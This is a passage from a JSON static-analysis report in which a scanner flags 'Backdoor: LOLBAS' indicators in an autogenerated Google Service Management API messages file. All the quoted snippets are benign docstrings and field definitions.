        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 423,
                  "startColumn": 5,
                  "endLine": 423,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n  Fields:\n    files: Set of source configuration files that are used to generate a\n      service config (`google.api.Service`).\n    id: A unique ID for a specific instance of this message, typically\n      assigned by the client for tracking purpose. If empty, the server may\n      choose to generate one instead.\n",
                    "rendered": {
                      "text": "\n  Fields:\n    files: Set of source configuration files that are used to generate a\n      service config (`google.api.Service`).\n    id: A unique ID for a specific instance of this message, typically\n      assigned by the client for tracking purpose. If empty, the server may\n      choose to generate one instead.\n",
                      "markdown": "`\n  Fields:\n    files: Set of source configuration files that are used to generate a\n      service config (`google.api.Service`).\n    id: A unique ID for a specific instance of this message, typically\n      assigned by the client for tracking purpose. If empty, the server may\n      choose to generate one instead.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 417,
                  "startColumn": 25,
                  "endLine": 417,
                  "endColumn": 34,
                  "snippet": {
                    "text": "class ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n  normalization.\n\n",
                    "rendered": {
                      "text": "class ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n  normalization.\n\n",
                      "markdown": "`class ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n  normalization.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 416,
                  "startColumn": 19,
                  "endLine": 416,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\nclass ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n  normalization.\n",
                    "rendered": {
                      "text": "\nclass ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n  normalization.\n",
                      "markdown": "`\nclass ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n  normalization.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 415,
                  "startColumn": 53,
                  "endLine": 415,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\n\nclass ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n",
                    "rendered": {
                      "text": "\n\nclass ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n",
                      "markdown": "`\n\nclass ConfigSource(_messages.Message):\n  r\"\"\"Represents a user-specified configuration for a service (as opposed to\n  the the generated service config form provided by `google.api.Service`).\n  This is meant to encode service config as manipulated directly by customers,\n  rather than the config form resulting from toolchain generation and\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 156,
                  "startColumn": 63,
                  "endLine": 157,
                  "snippet": {
                    "text": "  https://www.googleapis.com/auth/calendar.read\n\n  Fields:\n    providers: Defines a set of authentication providers that a service\n      supports.\n    rules: Individual rules for authentication.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  https://www.googleapis.com/auth/calendar.read\n\n  Fields:\n    providers: Defines a set of authentication providers that a service\n      supports.\n    rules: Individual rules for authentication.\n  \"\"\"\n\n",
                      "markdown": "`  https://www.googleapis.com/auth/calendar.read\n\n  Fields:\n    providers: Defines a set of authentication providers that a service\n      supports.\n    rules: Individual rules for authentication.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 113,
                  "startColumn": 20,
                  "endLine": 113,
                  "endColumn": 29,
                  "snippet": {
                    "text": "      - can be retrieved from    [OpenID\n      Discovery](https://openid.net/specs/openid-connect-discovery-1_0.html\n      of the issuer.  - can be inferred from the email domain of the issuer\n      (e.g. a Google service account).  Example:\n      https://www.googleapis.com/oauth2/v1/certs\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      - can be retrieved from    [OpenID\n      Discovery](https://openid.net/specs/openid-connect-discovery-1_0.html\n      of the issuer.  - can be inferred from the email domain of the issuer\n      (e.g. a Google service account).  Example:\n      https://www.googleapis.com/oauth2/v1/certs\n  \"\"\"\n\n",
                      "markdown": "`      - can be retrieved from    [OpenID\n      Discovery](https://openid.net/specs/openid-connect-discovery-1_0.html\n      of the issuer.  - can be inferred from the email domain of the issuer\n      (e.g. a Google service account).  Example:\n      https://www.googleapis.com/oauth2/v1/certs\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 54,
                  "endLine": 75,
                  "endColumn": 63,
                  "snippet": {
                    "text": "  duration the metric applies.  Essentially the generated metric is the Area\n  Under Curve(AUC) of the \"duration - resource\" usage curve. This AUC metric\n  is readily appliable to billing since \"billable resource usage\" depends on\n  resource usage and duration of the resource used.  A service config may\n  contain multiple resources and corresponding metrics. AreaUnderCurveParams\n  groups the relevant ones: which snapshot_metric and change_metric are used\n  to produce which generated_metric.\n",
                    "rendered": {
                      "text": "  duration the metric applies.  Essentially the generated metric is the Area\n  Under Curve(AUC) of the \"duration - resource\" usage curve. This AUC metric\n  is readily appliable to billing since \"billable resource usage\" depends on\n  resource usage and duration of the resource used.  A service config may\n  contain multiple resources and corresponding metrics. AreaUnderCurveParams\n  groups the relevant ones: which snapshot_metric and change_metric are used\n  to produce which generated_metric.\n",
                      "markdown": "`  duration the metric applies.  Essentially the generated metric is the Area\n  Under Curve(AUC) of the \"duration - resource\" usage curve. This AUC metric\n  is readily appliable to billing since \"billable resource usage\" depends on\n  resource usage and duration of the resource used.  A service config may\n  contain multiple resources and corresponding metrics. AreaUnderCurveParams\n  groups the relevant ones: which snapshot_metric and change_metric are used\n  to produce which generated_metric.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 5,
                  "endLine": 41,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      [semantic versioning](http://semver.org) where the major version number\n      indicates a breaking change and the minor version an additive, non-\n      breaking change. Both version numbers are signals to users what to\n      expect from different versions, and should be carefully chosen based on\n      the product plan.  The major version is also reflected in the package\n      name of the API, which must end in `v<major-version>`, as in\n      `google.feature.v1`. For major versions 0 and 1, the suffix can be\n",
                    "rendered": {
                      "text": "      [semantic versioning](http://semver.org) where the major version number\n      indicates a breaking change and the minor version an additive, non-\n      breaking change. Both version numbers are signals to users what to\n      expect from different versions, and should be carefully chosen based on\n      the product plan.  The major version is also reflected in the package\n      name of the API, which must end in `v<major-version>`, as in\n      `google.feature.v1`. For major versions 0 and 1, the suffix can be\n",
                      "markdown": "`      [semantic versioning](http://semver.org) where the major version number\n      indicates a breaking change and the minor version an additive, non-\n      breaking change. Both version numbers are signals to users what to\n      expect from different versions, and should be carefully chosen based on\n      the product plan.  The major version is also reflected in the package\n      name of the API, which must end in `v<major-version>`, as in\n      `google.feature.v1`. For major versions 0 and 1, the suffix can be\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 57,
                  "endLine": 29,
                  "endColumn": 66,
                  "snippet": {
                    "text": "    name: The fully qualified name of this api, including package name\n      followed by the api's simple name.\n    options: Any metadata attached to the API.\n    sourceContext: Source context for the protocol buffer service represented\n      by this message.\n    syntax: The source syntax of the service.\n    version: A version string for this api. If specified, must have the form\n",
                    "rendered": {
                      "text": "    name: The fully qualified name of this api, including package name\n      followed by the api's simple name.\n    options: Any metadata attached to the API.\n    sourceContext: Source context for the protocol buffer service represented\n      by this message.\n    syntax: The source syntax of the service.\n    version: A version string for this api. If specified, must have the form\n",
                      "markdown": "`    name: The fully qualified name of this api, including package name\n      followed by the api's simple name.\n    options: Any metadata attached to the API.\n    sourceContext: Source context for the protocol buffer service represented\n      by this message.\n    syntax: The source syntax of the service.\n    version: A version string for this api. If specified, must have the form\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 3,
                  "endLine": 3,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\"\"\"Generated message classes for servicemanagement version v1.\n\nThe service management API for Google Cloud Platform\n\"\"\"\n# NOTE: This file is autogenerated and should not be edited by hand.\n\n",
                    "rendered": {
                      "text": "\"\"\"Generated message classes for servicemanagement version v1.\n\nThe service management API for Google Cloud Platform\n\"\"\"\n# NOTE: This file is autogenerated and should not be edited by hand.\n\n",
                      "markdown": "`\"\"\"Generated message classes for servicemanagement version v1.\n\nThe service management API for Google Cloud Platform\n\"\"\"\n# NOTE: This file is autogenerated and should not be edited by hand.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3497,
                  "startColumn": 11,
                  "endLine": 3497,
                  "endColumn": 15,
                  "snippet": {
                    "text": "      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n\n  visibilityLabels = _messages.StringField(1, repeated=True)\n",
                    "rendered": {
                      "text": "      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n\n  visibilityLabels = _messages.StringField(1, repeated=True)\n",
                      "markdown": "`      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n  \"\"\"\n\n  visibilityLabels = _messages.StringField(1, repeated=True)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3494,
                  "startColumn": 47,
                  "endLine": 3494,
                  "endColumn": 51,
                  "snippet": {
                    "text": "      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n",
                    "rendered": {
                      "text": "      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n",
                      "markdown": "`      what API surface is visible to calls made by this project. The visible\n      surface is a union of the surface features associated with each label\n      listed here, plus the publicly visible (unrestricted) surface.  The\n      service producer may add or remove labels at any time. The service\n      consumer may add a label if the calling user has been granted permission\n      to do so by the producer.  The service consumer may also remove any\n      label at any time.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3486,
                  "startColumn": 19,
                  "endLine": 3486,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n\nclass VisibilitySettings(_messages.Message):\n  r\"\"\"Settings that control which features of the service are visible to the\n  consumer project.\n\n  Fields:\n",
                    "rendered": {
                      "text": "\n\nclass VisibilitySettings(_messages.Message):\n  r\"\"\"Settings that control which features of the service are visible to the\n  consumer project.\n\n  Fields:\n",
                      "markdown": "`\n\nclass VisibilitySettings(_messages.Message):\n  r\"\"\"Settings that control which features of the service are visible to the\n  consumer project.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3461,
                  "startColumn": 69,
                  "endLine": 3462,
                  "snippet": {
                    "text": "  API element.\n\n  Fields:\n    enforceRuntimeVisibility: Controls whether visibility is enforced at\n      runtime for requests to an API method. This setting has meaning only\n      when the selector applies to a method or an API.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. The default\n",
                    "rendered": {
                      "text": "  API element.\n\n  Fields:\n    enforceRuntimeVisibility: Controls whether visibility is enforced at\n      runtime for requests to an API method. This setting has meaning only\n      when the selector applies to a method or an API.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. The default\n",
                      "markdown": "`  API element.\n\n  Fields:\n    enforceRuntimeVisibility: Controls whether visibility is enforced at\n      runtime for requests to an API method. This setting has meaning only\n      when the selector applies to a method or an API.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. The default\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3441,
                  "startColumn": 5,
                  "endLine": 3441,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\n  Fields:\n    enforceRuntimeVisibility: Controls whether visibility rules are enforced\n      at runtime for requests to all APIs and methods.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. In service\n      config version 0, the default is false. In later config versions, it's\n",
                    "rendered": {
                      "text": "\n  Fields:\n    enforceRuntimeVisibility: Controls whether visibility rules are enforced\n      at runtime for requests to all APIs and methods.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. In service\n      config version 0, the default is false. In later config versions, it's\n",
                      "markdown": "`\n  Fields:\n    enforceRuntimeVisibility: Controls whether visibility rules are enforced\n      at runtime for requests to all APIs and methods.  If true, requests\n      without method visibility will receive a NOT_FOUND error, and any non-\n      visible fields will be scrubbed from the response messages. In service\n      config version 0, the default is false. In later config versions, it's\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3315,
                  "startColumn": 24,
                  "endLine": 3315,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n        service.\n",
                    "rendered": {
                      "text": "        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n        service.\n",
                      "markdown": "`        discovery document for the service will also be public and allow\n        unregistered access.\n      ORG_RESTRICTED: The service can be seen/used by users identified in the\n        service's access control policy and they are within the organization\n        that owns the service.  Access is further constrained to the group\n        controlled by the administrator of the project/org that owns the\n        service.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 3306,
                  "startColumn": 24,
                  "endLine": 3306,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n",
                    "rendered": {
                      "text": "\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n",
                      "markdown": "`\n    Values:\n      RESTRICTED: The service can only be seen/used by users identified in the\n        service's access control policy.  If the service has not been\n        whitelisted by your domain administrator for out-of-org publishing,\n        then this mode will be treated like ORG_RESTRICTED.\n      PUBLIC: The service can be seen/used by anyone.  If the service has not\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2953,
                  "startColumn": 57,
                  "endLine": 2953,
                  "endColumn": 65,
                  "snippet": {
                    "text": "      body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateService service method. Please use PatchService\n      method instead to do partial updates.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateService service method. Please use PatchService\n      method instead to do partial updates.\n  \"\"\"\n",
                      "markdown": "`      body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateService service method. Please use PatchService\n      method instead to do partial updates.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2935,
                  "startColumn": 57,
                  "endLine": 2935,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateServiceConfig service method. Please use\n      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n",
                    "rendered": {
                      "text": "    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateServiceConfig service method. Please use\n      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n",
                      "markdown": "`    service: A Service resource to be passed as the request body.\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n    updateMask: A mask specifying which fields to update. Update mask has been\n      deprecated on UpdateServiceConfig service method. Please use\n      PatchServiceConfig method instead to do partial updates.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2905,
                  "startColumn": 1,
                  "endLine": 2905,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    ALL = 3\n\n  consumerProjectId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                    "rendered": {
                      "text": "    ALL = 3\n\n  consumerProjectId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n",
                      "markdown": "`    ALL = 3\n\n  consumerProjectId = _messages.StringField(1, required=True)\n  expand = _messages.StringField(2)\n  serviceName = _messages.StringField(3, required=True)\n  view = _messages.EnumField('ViewValueValuesEnum', 4)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2883,
                  "startColumn": 21,
                  "endLine": 2883,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n  Fields:\n    consumerProjectId: The project ID of the consumer.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `quota_usage`\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n",
                    "rendered": {
                      "text": "\n  Fields:\n    consumerProjectId: The project ID of the consumer.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `quota_usage`\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n",
                      "markdown": "`\n  Fields:\n    consumerProjectId: The project ID of the consumer.\n    expand: Fields to expand in any results.  By default, the following fields\n      are not present in the result: - `operations` - `quota_usage`\n    serviceName: The name of the service.  See the `ServiceManager` overview\n      for naming requirements.  For example: `example.googleapis.com`.\n`"
